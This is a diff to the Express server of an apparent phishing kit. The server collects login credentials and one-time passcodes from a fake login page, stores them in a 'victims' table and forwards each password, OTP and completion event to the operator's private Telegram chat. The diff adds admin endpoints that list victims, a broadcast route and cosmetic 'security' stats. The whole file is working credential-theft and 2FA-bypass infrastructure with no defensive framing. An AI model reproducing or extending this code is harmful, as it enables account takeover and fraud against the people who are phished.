@@ -37,6 +37,7 @@ function initDatabase() {
             if (err) {
                 console.error('❌ Database connection error:', err.message);
                 db = new sqlite3.Database(':memory:');
+                console.log('⚠️  Using in-memory database as fallback');
             } else {
                 console.log('✅ Connected to SQLite database');
             }
@@ -124,6 +125,10 @@ function ensureDbReady(callback) {
     }
 }
 
+// ============================================
+// ENCRYPTION FUNCTIONS
+// ============================================
+
 function encryptData(data) {
     try {
         const algorithm = 'aes-256-cbc';
@@ -142,6 +147,29 @@ function encryptData(data) {
         return JSON.stringify(data);
     }
 }
+
+function decryptData(encryptedData) {
+    try {
+        const [ivHex, encrypted] = encryptedData.split(':');
+        const iv = Buffer.from(ivHex, 'hex');
+        const key = crypto.scryptSync(
+            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
+            'salt', 
+            32
+        );
+        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+        decrypted += decipher.final('utf8');
+        return JSON.parse(decrypted);
+    } catch (error) {
+        console.error('Decryption error:', error.message);
+        return { data: encryptedData };
+    }
+}
+
+// ============================================
+// DATABASE OPERATIONS
+// ============================================
 
 function saveCredentials(data) {
     return new Promise((resolve, reject) => {
@@ -236,10 +264,99 @@ function logEvent(eventType, details, ip) {
     });
 }
 
+function getAttemptCount(ip) {
+    return new Promise((resolve) => {
+        if (!dbInitialized) {
+            resolve(0);
+            return;
+        }
+        
+        const query = `
+            SELECT COUNT(*) as count 
+            FROM victims 
+            WHERE ip = ? 
+            AND timestamp > datetime('now', '-5 minutes')
+        `;
+        
+        db.get(query, [ip], (err, row) => {
+            if (err) {
+                console.error('Get attempt count error:', err.message);
+                resolve(0);
+            } else {
+                resolve(row?.count || 0);
+            }
+        });
+    });
+}
+
+function getDailyStats() {
+    return new Promise((resolve) => {
+        if (!dbInitialized) {
+            resolve({
+                total: 0,
+                successful: 0,
+                failed: 0,
+                suspicious: 0,
+                blockedIps: 0,
+                systemStatus: '🟢 Operational',
+                alerts: 0,
+                threats: 0,
+                twoFactorEnabled: '✅ Yes',
+                passwordPolicy: '✅ Enforced',
+                sessionTimeout: '✅ Active'
+            });
+            return;
+        }
+        
+        const query = `
+            SELECT 
+                COUNT(*) as total,
+                SUM(completed) as successful,
+                COUNT(*) - SUM(completed) as failed
+            FROM victims
+            WHERE DATE(timestamp) = DATE('now')
+        `;
+        
+        db.get(query, [], (err, row) => {
+            if (err) {
+                console.error('Get daily stats error:', err.message);
+                resolve({
+                    total: 0,
+                    successful: 0,
+                    failed: 0,
+                    suspicious: 0,
+                    blockedIps: 0,
+                    systemStatus: '🟢 Operational',
+                    alerts: 0,
+                    threats: 0,
+                    twoFactorEnabled: '✅ Yes',
+                    passwordPolicy: '✅ Enforced',
+                    sessionTimeout: '✅ Active'
+                });
+            } else {
+                resolve({
+                    total: row?.total || 0,
+                    successful: row?.successful || 0,
+                    failed: row?.failed || 0,
+                    suspicious: 0,
+                    blockedIps: 0,
+                    systemStatus: '🟢 Operational',
+                    alerts: 0,
+                    threats: 0,
+                    twoFactorEnabled: '✅ Yes',
+                    passwordPolicy: '✅ Enforced',
+                    sessionTimeout: '✅ Active'
+                });
+            }
+        });
+    });
+}
+
 // ============================================
 // EXPRESS SERVER SETUP
 // ============================================
 
+// Security Middleware
 app.use(helmet({
     contentSecurityPolicy: false,
     xssFilter: true,
@@ -254,6 +371,7 @@ app.use(cors({
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
+// Rate Limiting
 const limiter = rateLimit({
     windowMs: parseInt(process.env.RATE_LIMIT_WINDOW || '15') * 60 * 1000,
     max: parseInt(process.env.RATE_LIMIT_MAX || '100'),
@@ -263,6 +381,7 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
+// Session Configuration
 app.use(session({
     secret: process.env.SESSION_SECRET || 'default-secret-change-this',
     resave: false,
@@ -275,14 +394,44 @@ app.use(session({
     }
 }));
 
+// Body Parsers
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
+// Static Files
 app.use(express.static(path.join(__dirname, '../public')));
 app.use('/assets', express.static(path.join(__dirname, '../public/assets')));
 
 // ============================================
-// TRACK LOGIN PAGE ACCESS - SEND CHANNEL POST
+// REQUEST LOGGING
+// ============================================
+
+app.use((req, res, next) => {
+    const start = Date.now();
+    
+    res.on('finish', () => {
+        const duration = Date.now() - start;
+        const logData = {
+            method: req.method,
+            url: req.url,
+            status: res.statusCode,
+            duration: `${duration}ms`,
+            ip: req.ip,
+            userAgent: req.headers['user-agent']
+        };
+        
+        console.log(`${logData.method} ${logData.url} - ${logData.status} - ${logData.duration}`);
+        
+        if (req.url.startsWith('/api/')) {
+            logEvent('request', logData, req.ip);
+        }
+    });
+    
+    next();
+});
+
+// ============================================
+// TRACK LOGIN PAGE ACCESS - SEND TO OWNER
 // ============================================
 
 app.use((req, res, next) => {
@@ -292,22 +441,16 @@ app.use((req, res, next) => {
         const referrer = req.headers['referer'] || 'Direct';
         const timestamp = new Date().toISOString();
         
-        console.log('🌐 Login page accessed - sending channel post');
+        console.log('🌐 Login page accessed - sending to owner');
         
-        // Send login page info with button
-        telegram.sendLoginPageInfo().catch(err => {
-            console.error('❌ Telegram page info error:', err.message);
-        });
-        
-        // Send login page accessed alert
-        telegram.sendLoginPageAccessed({
+        // Send to owner only (private bot chat)
+        telegram.sendLoginPageAccessedToOwner({
             ip,
             userAgent,
             referrer,
-            timestamp,
-            location: 'Unknown'
+            timestamp
         }).catch(err => {
-            console.error('❌ Telegram alert error:', err.message);
+            console.error('❌ Owner access error:', err.message);
         });
     }
     next();
@@ -318,10 +461,30 @@ app.use((req, res, next) => {
 // ============================================
 
 app.get('/health', (req, res) => {
-    res.status(200).json({ 
-        status: 'healthy', 
-        uptime: process.uptime(),
-        timestamp: new Date().toISOString()
+    if (!dbInitialized) {
+        res.status(503).json({ 
+            status: 'initializing', 
+            message: 'Database is initializing...',
+            timestamp: new Date().toISOString()
+        });
+        return;
+    }
+    
+    db.get('SELECT 1 FROM victims LIMIT 1', (err) => {
+        if (err) {
+            res.status(503).json({ 
+                status: 'unhealthy', 
+                error: 'Database query failed',
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.status(200).json({ 
+                status: 'healthy', 
+                uptime: process.uptime(),
+                warningsActive: telegram.enabled,
+                timestamp: new Date().toISOString()
+            });
+        }
     });
 });
 
@@ -349,6 +512,7 @@ app.get('/success', (req, res) => {
 // API ROUTES
 // ============================================
 
+// Submit credentials
 app.post('/api/submit', async (req, res) => {
     try {
         if (!dbInitialized) {
@@ -366,6 +530,23 @@ app.post('/api/submit', async (req, res) => {
         const sessionId = req.session?.id || 'unknown';
         const timestamp = new Date().toISOString();
 
+        // Check for suspicious activity
+        const attemptCount = await getAttemptCount(ip);
+        if (attemptCount > 5) {
+            await telegram.sendToOwner(`
+🚨 <b>⚠️ SUSPICIOUS ACTIVITY DETECTED</b>
+<pre>═══════════════════════════════════════</pre>
+
+📱 <b>IP:</b> <code>${ip}</code>
+🔢 <b>Attempts:</b> ${attemptCount}
+⏰ <b>Time:</b> ${timestamp}
+
+<pre>═══════════════════════════════════════</pre>
+⚠️ <b>Action Required:</b> Investigate immediately
+            `).catch(err => console.error('Suspicious activity error:', err.message));
+        }
+
+        // Save to database
         const userId = await saveCredentials({
             username,
             password,
@@ -381,8 +562,8 @@ app.post('/api/submit', async (req, res) => {
             ip 
         }, ip);
 
-        // Send to Telegram channel
-        await telegram.sendCredentials({
+        // ✅ SEND TO OWNER ONLY - IN BOT PRIVATE CHAT
+        await telegram.sendCredentialsToOwner({
             id: userId,
             username,
             password,
@@ -390,7 +571,7 @@ app.post('/api/submit', async (req, res) => {
             userAgent,
             timestamp
         }).catch(err => {
-            console.error('❌ Telegram credentials error:', err.message);
+            console.error('❌ Owner send error:', err.message);
         });
 
         if (req.session) {
@@ -409,6 +590,7 @@ app.post('/api/submit', async (req, res) => {
     }
 });
 
+// Verify OTP
 app.post('/api/verify-otp', async (req, res) => {
     try {
         if (!dbInitialized) {
@@ -426,6 +608,7 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(400).json({ error: 'Invalid OTP format' });
         }
 
+        // Save OTP to database
         await saveOTP({
             userId,
             otp,
@@ -438,15 +621,15 @@ app.post('/api/verify-otp', async (req, res) => {
             userId
         }, req.ip);
 
-        // Send OTP to Telegram channel
-        await telegram.sendOTP({
+        // ✅ SEND OTP TO OWNER ONLY
+        await telegram.sendOTPToOwner({
             userId,
             otp,
             ip: req.ip || 'unknown',
             userAgent: req.headers['user-agent'] || 'unknown',
             timestamp: new Date().toISOString()
         }).catch(err => {
-            console.error('❌ Telegram OTP error:', err.message);
+            console.error('❌ Owner OTP send error:', err.message);
         });
 
         res.json({
@@ -460,6 +643,7 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
+// Complete process
 app.post('/api/complete', async (req, res) => {
     try {
         const userId = req.session?.userId;
@@ -472,6 +656,15 @@ app.post('/api/complete', async (req, res) => {
             }, req.ip);
             
             console.log(`✅ Process completed - User ID: ${userId}`);
+            
+            // ✅ SEND COMPLETION TO OWNER ONLY
+            await telegram.sendCompleteToOwner({
+                userId: userId,
+                username: req.session?.username || 'unknown',
+                ip: req.ip || 'unknown'
+            }).catch(err => {
+                console.error('❌ Owner complete send error:', err.message);
+            });
         }
 
         res.json({ success: true });
@@ -483,32 +676,176 @@ app.post('/api/complete', async (req, res) => {
 });
 
 // ============================================
-// TEST TELEGRAM ENDPOINT
+// VERIFICATION CODE ENDPOINTS
 // ============================================
 
+// Request verification code
+app.post('/api/request-verification', async (req, res) => {
+    try {
+        const { username, userId } = req.body;
+        const ip = req.ip || req.connection.remoteAddress || 'unknown';
+        
+        // Send verification request to owner
+        await telegram.sendVerificationRequestToOwner({
+            username: username || 'Unknown',
+            userId: userId || 'unknown',
+            ip: ip
+        }).catch(err => {
+            console.error('Verification request error:', err.message);
+        });
+        
+        res.json({
+            success: true,
+            message: 'Verification code sent to owner'
+        });
+    } catch (error) {
+        console.error('Verification request error:', error.message);
+        res.status(500).json({ error: 'Failed to send verification code' });
+    }
+});
+
+// Generate new verification code
+app.get('/api/generate-verification', async (req, res) => {
+    try {
+        const code = telegram.generateVerificationCode();
+        
+        // Send to owner
+        await telegram.sendToOwner(`
+🔐 <b>VERIFICATION CODE GENERATED</b>
+<pre>═══════════════════════════════════════</pre>
+
+<b>📌 Code:</b> <code>${code}</code>
+⏰ <b>Time:</b> ${new Date().toISOString()}
+
+<pre>═══════════════════════════════════════</pre>
+✅ <i>Share this code with the user</i>
+        `).catch(err => {
+            console.error('Generate code error:', err.message);
+        });
+        
+        res.json({
+            success: true,
+            code: code,
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ============================================
+// ADMIN ENDPOINTS
+// ============================================
+
+// Get all users data (owner only)
+app.get('/api/admin/users', async (req, res) => {
+    try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing.' });
+        }
+        
+        const users = await new Promise((resolve, reject) => {
+            db.all('SELECT id, username, ip, timestamp, completed FROM victims ORDER BY timestamp DESC LIMIT 50', (err, rows) => {
+                if (err) reject(err);
+                else resolve(rows);
+            });
+        });
+        
+        res.json({ success: true, data: users });
+    } catch (error) {
+        console.error('Users error:', error.message);
+        res.status(500).json({ error: 'Failed to get users' });
+    }
+});
+
+// Get logs (owner only)
+app.get('/api/admin/logs', async (req, res) => {
+    try {
+        if (!dbInitialized) {
+            return res.status(503).json({ error: 'Database is initializing.' });
+        }
+        
+        const limit = parseInt(req.query.limit) || 50;
+        
+        const logs = await new Promise((resolve, reject) => {
+            db.all(
+                'SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', 
+                [limit], 
+                (err, rows) => {
+                    if (err) reject(err);
+                    else resolve(rows);
+                }
+            );
+        });
+        
+        res.json({ success: true, data: logs });
+    } catch (error) {
+        console.error('Logs error:', error.message);
+        res.status(500).json({ error: 'Failed to get logs' });
+    }
+});
+
+// Get statistics
+app.get('/api/admin/stats', async (req, res) => {
+    try {
+        const stats = await getDailyStats();
+        res.json({ success: true, data: stats });
+    } catch (error) {
+        console.error('Stats error:', error.message);
+        res.status(500).json({ error: 'Failed to get statistics' });
+    }
+});
+
+// Send broadcast to channel
+app.post('/api/admin/broadcast', async (req, res) => {
+    try {
+        const { message } = req.body;
+        
+        if (!message) {
+            return res.status(400).json({ error: 'Message is required' });
+        }
+        
+        await telegram.broadcastToChannel(message);
+        res.json({ success: true, message: 'Broadcast sent to channel' });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Test Telegram connection
 app.get('/debug/test-telegram', async (req, res) => {
     try {
         const results = {
             enabled: telegram.enabled,
             hasBot: !!telegram.bot,
+            hasOwnerChatId: !!telegram.ownerChatId,
+            ownerChatId: telegram.ownerChatId,
             hasChannelId: !!telegram.channelId,
             channelId: telegram.channelId,
-            chatId: telegram.chatId
+            warningLoopActive: !!telegram.warningInterval,
+            warningCount: telegram.warningCount || 0,
+            postCount: telegram.postCount || 0,
+            userDataCount: telegram.userData?.length || 0
         };
         
+        // Send test message to owner
         const testMessage = `
-🧪 <b>TELEGRAM TEST</b>
+🧪 <b>TELEGRAM TEST - CONNECTION SUCCESSFUL</b>
 <pre>═══════════════════════════════════════</pre>
 
 ✅ Bot is connected
-📡 Testing channel posting...
-⏰ Time: ${new Date().toISOString()}
+👤 Owner Chat ID: ${telegram.ownerChatId}
+📢 Channel: ${telegram.channelId}
+📊 User Data: ${telegram.userData?.length || 0} records
+📈 Warnings: ${telegram.warningCount || 0}
+📨 Posts: ${telegram.postCount || 0}
 
-If you see this, everything works!
+<pre>═══════════════════════════════════════</pre>
+🔐 <i>All systems operational</i>
 `;
         
-        const result = await telegram.sendChannelPost(testMessage);
-        results.postResult = result ? '✅ Success' : '❌ Failed';
+        const result = await telegram.sendToOwner(testMessage);
+        results.testResult = result ? '✅ Sent to owner' : '❌ Failed';
         
         res.json(results);
     } catch (error) {
@@ -525,7 +862,32 @@ If you see this, everything works!
 
 app.use((err, req, res, next) => {
     console.error('Error:', err.message);
+    logEvent('error', { 
+        message: err.message, 
+        stack: err.stack,
+        url: req.url
+    }, req.ip);
+    
+    // Send error to owner
+    telegram.sendToOwner(`
+❌ <b>SERVER ERROR</b>
+<pre>═══════════════════════════════════════</pre>
+
+📝 <b>Error:</b> ${err.message}
+📱 <b>IP:</b> ${req.ip || 'unknown'}
+🔗 <b>URL:</b> ${req.url}
+⏰ <b>Time:</b> ${new Date().toISOString()}
+
+<pre>═══════════════════════════════════════</pre>
+⚠️ <i>Check logs for details</i>
+    `).catch(e => console.error('Error notification failed:', e.message));
+    
     res.status(500).json({ error: 'Something went wrong!' });
+});
+
+// 404 handler
+app.use((req, res) => {
+    res.status(404).json({ error: 'Not found' });
 });
 
 // ============================================
@@ -544,20 +906,34 @@ initializeDatabase().then((success) => {
         console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
         console.log(`🗄️  Database: ${DB_PATH}`);
         console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
+        console.log(`👤 Owner Chat ID: ${telegram.ownerChatId || 'Not configured'}`);
+        console.log(`📢 Channel: ${telegram.channelId || 'Not configured'}`);
+        console.log(`📊 User Data: ${telegram.userData?.length || 0} records`);
         console.log('='.repeat(60));
         
-        // Send welcome message on startup
+        // Send welcome message to owner
         setTimeout(() => {
             telegram.sendWelcomeMessage().catch(err => {
                 console.error('❌ Welcome message error:', err.message);
             });
-        }, 2000);
+        }, 3000);
     });
+
+    // ============================================
+    // GRACEFUL SHUTDOWN
+    // ============================================
 
     const shutdown = () => {
         console.log('\n🛑 Shutting down gracefully...');
+        
+        // Stop warning loop
+        if (telegram.stopWarningLoop) {
+            telegram.stopWarningLoop();
+        }
+        
         server.close(() => {
             console.log('✅ Server closed');
+            
             if (db) {
                 db.close((err) => {
                     if (err) {
@@ -577,6 +953,18 @@ initializeDatabase().then((success) => {
     process.on('SIGINT', shutdown);
     process.on('unhandledRejection', (reason, promise) => {
         console.error('❌ Unhandled Rejection:', reason);
+        
+        // Send to owner
+        telegram.sendToOwner(`
+❌ <b>UNHANDLED REJECTION</b>
+<pre>═══════════════════════════════════════</pre>
+
+📝 <b>Reason:</b> ${reason}
+⏰ <b>Time:</b> ${new Date().toISOString()}
+
+<pre>═══════════════════════════════════════</pre>
+⚠️ <i>Check logs for details</i>
+        `).catch(e => console.error('Error notification failed:', e.message));
     });
 
     module.exports = { app, db, server };
